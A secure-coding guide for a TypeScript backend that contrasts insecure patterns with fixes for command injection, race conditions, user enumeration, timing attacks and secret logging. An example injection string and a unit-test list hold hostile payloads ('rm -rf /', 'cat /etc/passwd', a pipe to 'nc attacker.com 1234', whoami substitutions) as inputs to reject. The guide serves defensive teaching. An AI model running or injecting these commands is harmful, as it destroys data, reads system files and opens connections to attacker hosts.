# Secure Code Patterns Guide

This guide provides specific examples of insecure patterns found in the codebase and their secure alternatives.

---

## 🛡️ Command Execution Security

### ❌ INSECURE - String Concatenation with exec()

```typescript
// DON'T DO THIS - Vulnerable to command injection
const command = `git clone ${cloneUrl} ${repoPath} --bare`;
exec(command, (error) => {
  if (error) reject(error);
  else resolve();
});

// Also vulnerable:
const command = `cd ${inputPath} && infisical scan -r "${outputPath}"`;
exec(command, callback);
```

**Why it's dangerous:**
```typescript
// An attacker could set cloneUrl to:
cloneUrl = "http://example.com; rm -rf / #"
// Resulting in:
"git clone http://example.com; rm -rf / # /path --bare"
```

### ✅ SECURE - Use execFile with Array Arguments

```typescript
import { execFile } from 'child_process';
import { promisify } from 'util';

const execFileAsync = promisify(execFile);

// DO THIS - Safe from command injection
export const cloneRepository = async ({ cloneUrl, repoPath }: TCloneRepository): Promise<void> => {
  try {
    await execFileAsync('git', ['clone', cloneUrl, repoPath, '--bare'], {
      timeout: 30000,
      maxBuffer: 10 * 1024 * 1024
    });
  } catch (error) {
    throw new Error(`Failed to clone repository: ${error.message}`);
  }
};
```

**Additional Safety Measures:**
```typescript
// Validate inputs before execution
import { isValidUrl } from '@app/lib/validator';

const cloneRepository = async ({ cloneUrl, repoPath }: TCloneRepository) => {
  // Validate URL format
  if (!isValidUrl(cloneUrl)) {
    throw new BadRequestError({ message: 'Invalid repository URL' });
  }
  
  // Validate path doesn't contain directory traversal
  if (repoPath.includes('..') || repoPath.includes('~')) {
    throw new BadRequestError({ message: 'Invalid repository path' });
  }
  
  // Use execFile with timeout
  await execFileAsync('git', ['clone', cloneUrl, repoPath, '--bare'], {
    timeout: 30000,
    maxBuffer: 10 * 1024 * 1024
  });
};
```

---

## 🔒 Concurrency Control

### ❌ INSECURE - Non-Atomic Read-Modify-Write

```typescript
// DON'T DO THIS - Race condition vulnerability
const $incrementConnectionConcurrencyCount = async (connectionId: string) => {
  const concurrencyCount = await keyStore.getItem(KeyStorePrefixes.AppConnectionConcurrentJobs(connectionId));
  const currentCount = Number.parseInt(concurrencyCount || "0", 10);
  const incrementedCount = Number.isNaN(currentCount) ? 1 : currentCount + 1;
  
  // PROBLEM: Another request could read the same value before this write completes
  await keyStore.setItemWithExpiry(
    KeyStorePrefixes.AppConnectionConcurrentJobs(connectionId),
    (REQUEUE_MS * REQUEUE_LIMIT) / 1000,
    incrementedCount
  );
};
```

**What can go wrong:**
```
Time | Request A                | Request B
-----|--------------------------|---------------------------
T1   | Read count = 2          |
T2   |                         | Read count = 2
T3   | Increment to 3          |
T4   |                         | Increment to 3
T5   | Write count = 3         |
T6   |                         | Write count = 3 (overwrites!)
     | Expected: 4, Actual: 3  |
```

### ✅ SECURE - Atomic Redis Operations

```typescript
// DO THIS - Use atomic operations
const $incrementConnectionConcurrencyCount = async (connectionId: string) => {
  const key = KeyStorePrefixes.AppConnectionConcurrentJobs(connectionId);
  const ttl = (REQUEUE_MS * REQUEUE_LIMIT) / 1000;
  
  // Use Redis INCR for atomic increment
  const count = await redis.incr(key);
  
  // Set expiry only if this is the first increment
  if (count === 1) {
    await redis.expire(key, ttl);
  }
  
  return count;
};

const $decrementConnectionConcurrencyCount = async (connectionId: string) => {
  const key = KeyStorePrefixes.AppConnectionConcurrentJobs(connectionId);
  
  // Use Redis DECR for atomic decrement, ensure it doesn't go below 0
  const count = await redis.decr(key);
  
  if (count < 0) {
    await redis.set(key, 0);
    return 0;
  }
  
  return count;
};
```

**Even Better - Use Lua Script for Complex Operations:**
```typescript
const incrementWithLimit = async (connectionId: string, limit: number) => {
  const key = KeyStorePrefixes.AppConnectionConcurrentJobs(connectionId);
  const ttl = (REQUEUE_MS * REQUEUE_LIMIT) / 1000;
  
  // Lua script executes atomically
  const luaScript = `
    local current = redis.call('GET', KEYS[1])
    if current and tonumber(current) >= tonumber(ARGV[2]) then
      return -1
    end
    local new_val = redis.call('INCR', KEYS[1])
    redis.call('EXPIRE', KEYS[1], ARGV[1])
    return new_val
  `;
  
  const result = await redis.eval(luaScript, 1, key, ttl, limit);
  
  if (result === -1) {
    throw new Error('Concurrency limit reached');
  }
  
  return result;
};
```

---

## 🔐 Race Condition Prevention

### ❌ INSECURE - Check-Then-Act Pattern

```typescript
// DON'T DO THIS - Classic race condition
const ping = async () => {
  // PROBLEM: auth could be set to null between this check and usage
  if (!auth) return;
  
  const { actorId, projectId } = auth; // Could fail if auth becomes null
  // ...
};
```

### ✅ SECURE - Capture Reference First

```typescript
// DO THIS - Capture reference atomically
const ping = async () => {
  const currentAuth = auth; // Capture reference
  if (!currentAuth) return;
  
  // Now safe to use - we have a stable reference
  const { actorId, projectId } = currentAuth;
  const key = KeyStorePrefixes.ActiveSSEConnections(projectId, actorId, id);
  await redis.set(key, "1", "EX", 60);
  send({ type: "ping" });
};
```

**Better - Use State Machine:**
```typescript
enum ConnectionState {
  INITIALIZING = 'initializing',
  AUTHENTICATED = 'authenticated',
  CLOSED = 'closed'
}

class SSEConnection {
  private state: ConnectionState = ConnectionState.INITIALIZING;
  private auth?: AuthInfo;
  
  async authenticate(authInfo: AuthInfo) {
    if (this.state !== ConnectionState.INITIALIZING) {
      throw new Error('Connection already authenticated or closed');
    }
    this.auth = authInfo;
    this.state = ConnectionState.AUTHENTICATED;
  }
  
  async ping() {
    if (this.state !== ConnectionState.AUTHENTICATED) {
      return; // Safely handle any state
    }
    
    const { actorId, projectId } = this.auth!; // TypeScript knows this is safe
    // ... rest of ping logic
  }
}
```

---

## 🗄️ Database Operations

### ❌ INSECURE - Missing Transaction Isolation

```typescript
// DON'T DO THIS - Can lead to duplicate entries
const createProject = async (data: ProjectData) => {
  const existing = await projectDAL.findByName(data.name);
  if (existing) {
    throw new Error('Project already exists');
  }
  
  // PROBLEM: Another request could create the same project here
  const project = await projectDAL.create(data);
  return project;
};
```

### ✅ SECURE - Use Advisory Locks or Unique Constraints

```typescript
// DO THIS - Use PostgreSQL advisory locks
const createProject = async (data: ProjectData) => {
  return await db.transaction(async (tx) => {
    // Acquire advisory lock for this organization
    await tx.raw("SELECT pg_advisory_xact_lock(?)", [
      PgSqlLock.CreateProject(data.organizationId)
    ]);
    
    const existing = await projectDAL.findByName(data.name, tx);
    if (existing) {
      throw new ConflictError({ message: 'Project already exists' });
    }
    
    const project = await projectDAL.create(data, tx);
    return project;
    // Lock is automatically released when transaction ends
  });
};

// ALSO DO THIS - Add unique constraint at database level
// In migration:
table.unique(['organizationId', 'name']); // Prevents duplicates at DB level
```

---

## 🔑 Authentication & Authorization

### ❌ INSECURE - User Enumeration

```typescript
// DON'T DO THIS - Reveals whether user exists
if (user && user.isAccepted) {
  throw new BadRequestError({ 
    message: "Failed to send verification code for complete account" 
  });
}
if (!user) {
  throw new BadRequestError({ 
    message: "User not found" 
  });
}
```

### ✅ SECURE - Consistent Error Messages

```typescript
// DO THIS - Same error regardless of reason
const sendVerificationCode = async (email: string) => {
  const sanitizedEmail = email.trim().toLowerCase();
  const user = await userDAL.findByEmail(sanitizedEmail);
  
  // Don't reveal whether user exists or is already verified
  if (!user || user.isAccepted) {
    // Return success even if user doesn't exist or is already verified
    // This prevents user enumeration
    logger.info({ email: sanitizedEmail }, 'Verification code request for invalid user');
    return { success: true }; // Same response as success case
  }
  
  await sendVerificationEmail(user);
  return { success: true };
};
```

---

## 🔢 Input Validation

### ❌ INSECURE - Missing Radix or Validation

```typescript
// DON'T DO THIS - Implicit radix, no validation
const count = Number.parseInt(input);
const limit = parseFloat(limitStr);
```

### ✅ SECURE - Explicit Validation

```typescript
// DO THIS - Validate and parse safely
const parsePositiveInteger = (value: string | null | undefined, defaultValue: number = 0): number => {
  if (!value) return defaultValue;
  
  const parsed = Number.parseInt(value, 10);
  
  if (Number.isNaN(parsed)) {
    logger.warn({ value }, 'Failed to parse integer');
    return defaultValue;
  }
  
  if (parsed < 0) {
    logger.warn({ value, parsed }, 'Negative value not allowed');
    return defaultValue;
  }
  
  return parsed;
};

// Usage:
const count = parsePositiveInteger(concurrencyCount, 0);
```

---

## ⏱️ Timing Attack Prevention

### ❌ INSECURE - Direct String Comparison

```typescript
// DON'T DO THIS - Vulnerable to timing attacks
if (token === expectedToken) {
  // grant access
}

if (password === storedPassword) {
  // authenticate
}
```

### ✅ SECURE - Constant-Time Comparison

```typescript
import crypto from 'crypto';

// DO THIS - Use timing-safe comparison
const isValidToken = (providedToken: string, expectedToken: string): boolean => {
  if (!providedToken || !expectedToken) return false;
  
  // Ensure same length to prevent timing attacks
  if (providedToken.length !== expectedToken.length) return false;
  
  return crypto.timingSafeEqual(
    Buffer.from(providedToken),
    Buffer.from(expectedToken)
  );
};

// For password hashing - ALWAYS use bcrypt or argon2
import bcrypt from 'bcrypt';

const verifyPassword = async (provided: string, hash: string): Promise<boolean> => {
  // bcrypt.compare is already timing-safe
  return await bcrypt.compare(provided, hash);
};
```

---

## 🔒 Secret Management

### ❌ INSECURE - Secrets in Logs or Errors

```typescript
// DON'T DO THIS - Logs sensitive data
logger.error({ apiKey, password, token }, 'Authentication failed');

throw new Error(`Failed to connect with credentials: ${JSON.stringify(credentials)}`);
```

### ✅ SECURE - Redact Sensitive Information

```typescript
// DO THIS - Redact sensitive fields
const sanitizeForLogging = (obj: any): any => {
  const SENSITIVE_FIELDS = ['password', 'apiKey', 'token', 'secret', 'privateKey'];
  
  if (!obj || typeof obj !== 'object') return obj;
  
  const sanitized = { ...obj };
  for (const key of Object.keys(sanitized)) {
    if (SENSITIVE_FIELDS.some(field => key.toLowerCase().includes(field))) {
      sanitized[key] = '***REDACTED***';
    } else if (typeof sanitized[key] === 'object') {
      sanitized[key] = sanitizeForLogging(sanitized[key]);
    }
  }
  return sanitized;
};

// Usage:
logger.error(sanitizeForLogging({ apiKey, username }), 'Authentication failed');

throw new Error('Failed to connect: Invalid credentials');
```

---

## 📅 Date Handling

### ❌ INSECURE - Hardcoded Dates

```typescript
// DON'T DO THIS - Will break after this date
nextUpdate: new Date("2025/12/12"),
```

### ✅ SECURE - Dynamic Date Calculation

```typescript
// DO THIS - Calculate dates dynamically
const CRL_UPDATE_INTERVAL_DAYS = 30;

const getNextCRLUpdate = (): Date => {
  const now = new Date();
  const nextUpdate = new Date(now);
  nextUpdate.setDate(nextUpdate.getDate() + CRL_UPDATE_INTERVAL_DAYS);
  return nextUpdate;
};

// Usage:
nextUpdate: getNextCRLUpdate(),
```

---

## 🎯 Error Handling Best Practices

### ❌ POOR - Silent Failures

```typescript
// DON'T DO THIS - Swallows errors
try {
  await dangerousOperation();
} catch (error) {
  // Silence is not golden in error handling
}
```

### ✅ GOOD - Proper Error Handling

```typescript
// DO THIS - Handle errors appropriately
try {
  await dangerousOperation();
} catch (error) {
  logger.error(
    { 
      error: sanitizeForLogging(error),
      operation: 'dangerousOperation',
      context: { userId, projectId }
    },
    'Operation failed'
  );
  
  // Rethrow with context or handle gracefully
  throw new InternalServerError({
    message: 'Failed to complete operation',
    cause: error
  });
}
```

---

## 🧪 Testing Security Issues

### Command Injection Tests

```typescript
describe('cloneRepository', () => {
  it('should reject malicious URLs', async () => {
    const maliciousUrls = [
      'http://example.com; rm -rf /',
      'http://example.com && cat /etc/passwd',
      'http://example.com | nc attacker.com 1234',
      'http://example.com`whoami`',
      'http://example.com$(whoami)'
    ];
    
    for (const url of maliciousUrls) {
      await expect(
        cloneRepository({ cloneUrl: url, repoPath: '/tmp/repo' })
      ).rejects.toThrow();
    }
  });
});
```

### Race Condition Tests

```typescript
describe('concurrency control', () => {
  it('should handle concurrent increments correctly', async () => {
    const connectionId = 'test-connection';
    const concurrentRequests = 100;
    
    // Create multiple concurrent increment operations
    const promises = Array.from({ length: concurrentRequests }, () =>
      incrementConnectionConcurrencyCount(connectionId)
    );
    
    await Promise.all(promises);
    
    // Verify final count is exactly what we expect
    const finalCount = await getConnectionConcurrencyCount(connectionId);
    expect(finalCount).toBe(concurrentRequests);
  });
});
```

---

## 📚 Additional Resources

### Security Checklist for Code Reviews

- [ ] No command execution with string concatenation
- [ ] All user input is validated and sanitized
- [ ] Sensitive data is not logged
- [ ] Passwords/tokens use timing-safe comparison
- [ ] Database operations use appropriate locking
- [ ] Race conditions are prevented with proper synchronization
- [ ] Error messages don't reveal sensitive information
- [ ] All parseInt/parseFloat calls use explicit radix
- [ ] No hardcoded credentials or expiry dates
- [ ] Proper error handling without silent failures

### Tools to Use

1. **ESLint** - Configure security rules
2. **SonarQube** - Static code analysis
3. **npm audit** - Dependency vulnerability scanning
4. **Snyk** - Continuous security monitoring
5. **OWASP ZAP** - Dynamic security testing

---

**Remember:** Security is not a feature, it's a requirement. When in doubt, choose the more secure option.
